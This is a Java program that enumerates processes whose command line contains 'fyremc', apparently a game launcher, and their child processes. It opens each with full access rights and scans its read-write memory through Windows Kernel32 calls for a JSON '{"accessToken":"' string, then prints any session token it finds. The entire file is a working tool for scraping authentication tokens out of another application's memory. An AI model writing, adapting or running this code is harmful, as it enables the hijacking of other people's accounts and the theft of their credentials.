package azahriah.nemhibas.jdktest;

import azahriah.nemhibas.jdktest.natives.windows.kernel32.Kernel32;
import azahriah.nemhibas.jdktest.natives.windows.kernel32._MEMORY_BASIC_INFORMATION;
import jdk.incubator.foreign.*;

import java.nio.charset.StandardCharsets;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class Main {
    private static final int CHUNK_SIZE = 32;
    private static final int JSON_BUFFER_SIZE = 512;

    public static void main(String[] args) {
        System.out.println("Porog a fornettigyar");
        ExecutorService executor = Executors.newFixedThreadPool(8);

        ProcessHandle.allProcesses()
                .filter(proc -> proc.info().command().orElse("").toLowerCase().contains("fyremc"))
                .forEach(proc -> {
                    executor.execute(() -> {
                        String res = tryFindAccessToken(proc.pid());
                        if (!res.isEmpty()) {
                            System.out.println("[!] Found something in " + proc.pid() + " (P): " + res.split("\0")[0]);
                        }
                    });

                    proc.children().forEach(child -> executor.execute(() -> {
                        String res = tryFindAccessToken(child.pid());
                        if (!res.isEmpty()) {
                            System.out.println("[!] Found something in " + proc.pid() + ": " + res.split("\0")[0]);
                        }
                    }));
                });

        executor.shutdown();
    }

    public static String tryFindAccessToken(long pid) {
        MemoryAddress handle = Kernel32.OpenProcess(Kernel32.PROCESS_ALL_ACCESS(), 0, (int) pid);

        try {
            if (handle == MemoryAddress.NULL) {
                throw new RuntimeException("failed to open handle");
            }

            try (ResourceScope scope = ResourceScope.newConfinedScope()) {
                SegmentAllocator segmentAllocator = SegmentAllocator.ofScope(scope);
                MemorySegment buffer = segmentAllocator.allocateArray(CLinker.C_CHAR, CHUNK_SIZE);

                MemoryAddress pagePointer = MemoryAddress.ofLong(0);
                MemorySegment memoryInfo = _MEMORY_BASIC_INFORMATION.allocate(scope);

                while (Kernel32.VirtualQueryEx(handle, pagePointer, memoryInfo, _MEMORY_BASIC_INFORMATION.sizeof()) != 0) {
                    if (_MEMORY_BASIC_INFORMATION.State$get(memoryInfo) == Kernel32.MEM_COMMIT() &&
                            _MEMORY_BASIC_INFORMATION.Protect$get(memoryInfo) == Kernel32.PAGE_READWRITE()) {
                        for (long i = 0; i < _MEMORY_BASIC_INFORMATION.RegionSize$get(memoryInfo); i += CHUNK_SIZE) {
                            MemoryAddress readPointer = pagePointer.addOffset(i);

                            if (Kernel32.ReadProcessMemory(handle, readPointer, buffer, CHUNK_SIZE, MemoryAddress.NULL) != 0) {
                                String bufferString = new String(buffer.toByteArray(), StandardCharsets.US_ASCII);

                                if (bufferString.contains("{\"access")) {
                                    buffer = segmentAllocator.allocateArray(CLinker.C_CHAR, JSON_BUFFER_SIZE);

                                    if (Kernel32.ReadProcessMemory(handle, readPointer, buffer, JSON_BUFFER_SIZE, MemoryAddress.NULL) != 0) {
                                        bufferString = new String(buffer.toByteArray(), StandardCharsets.US_ASCII);

                                        int idx = bufferString.indexOf("{\"accessToken\":\"");
                                        if (idx != -1) {
                                            return bufferString.substring(idx, bufferString.length() - idx);
                                        }
                                    }
                                }
                            }
                        }
                    }

                    pagePointer = pagePointer.addOffset(_MEMORY_BASIC_INFORMATION.RegionSize$get(memoryInfo));
                }
            }
            return "";
        } finally {
            Kernel32.CloseHandle(handle);
        }
    }
}
